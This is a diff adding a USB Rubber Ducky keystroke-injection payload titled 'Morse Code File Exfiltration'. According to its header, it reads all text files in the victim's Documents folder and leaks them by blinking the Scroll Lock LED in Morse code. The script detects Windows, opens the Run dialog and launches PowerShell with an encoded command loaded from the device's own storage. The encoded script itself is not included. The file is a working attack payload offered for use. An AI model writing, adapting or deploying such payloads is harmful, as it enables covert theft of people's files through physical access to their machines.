@@ -1,0 +1,60 @@
+REM Title:        Morse Code File Exfiltration
+REM Description:  Reads all txt files in myDocs and Flashes the Scrolllock on and off to represent morse code  
+REM Author:       Cribbit
+REM Version:      1.2
+REM Category:     Exfiltration
+REM Target:       Windows (Powershell 5.1+)
+REM Attackmodes:  HID & STORAGE
+REM Note:        For characters outside the Morse code 0..9 A..Z it now flash one long pulse then the chars ordinal value i.e. (@ = 64 = -.... ....-)	
+ATTACKMODE HID STORAGE
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.0
+
+    REM Windows fully passive OS Detection and passive Detect Ready
+    REM Includes its own passive detect ready. Does not require
+    REM additional extensions
+
+    REM USAGE:
+    REM Extension runs inline (here)
+    REM Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+    REM boot delay
+    REM $_OS will be set to WINDOWS or NOT_WINDOWS
+
+    REM CONFIGURATION:
+    DEFINE MAX_WAIT 150
+    DEFINE CHECK_INTERVAL 20
+    DEFINE WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE NOT_WINDOWS 7
+
+    VAR $MAX_TRIES = MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    ELSE
+        $_OS = NOT_WINDOWS
+    END_IF
+
+    REM EXAMPLE USAGE AFTER EXTENSION
+    REM IF ($_OS == WINDOWS) THEN
+    REM     STRING HELLO WINDOWS!
+    REM ELSE
+    REM     STRING HELLO WORLD!
+    REM END_IF
+END_EXTENSION
+
+
+IF ($_OS == WINDOWS)
+    LED_GREEN
+    REM Give explorer time to show 
+    DELAY 2000
+    GUI r
+    DELAY 200
+    STRINGLN powershell .(powershell.exe -encodedCommand (gc((gwmi win32_volume -f 'label=''DUCKY''').Name+'\b.txt')))
+ELSE
+    LED_RED
+END_IF
+
